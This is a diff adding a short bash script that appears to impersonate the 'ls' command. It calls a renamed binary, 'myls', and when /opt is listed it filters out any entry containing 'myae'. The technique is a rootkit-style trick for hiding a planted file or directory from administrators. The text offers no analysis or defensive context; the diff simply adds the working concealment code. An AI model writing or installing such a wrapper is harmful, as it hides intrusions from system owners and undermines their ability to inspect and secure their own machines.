@@ -1,0 +1,26 @@
+#!/bin/bash
+set -e
+set +x
+
+IS_HIDE=0
+LS_DIR=$(pwd)
+
+if [ "$LS_DIR" == "/opt" ]; then
+    IS_HIDE=1
+fi
+
+for i in "$@"; do
+    if [[ "$i" =~ "opt" ]]; then
+        IS_HIDE=1
+        break
+    fi
+done
+
+params=("$@")
+if [ $IS_HIDE -eq 1 ]; then
+    RESULT=`myls "${params[@]}" | grep -v myae`
+else
+    RESULT=`myls "${params[@]}"`
+fi
+
+echo "$RESULT"
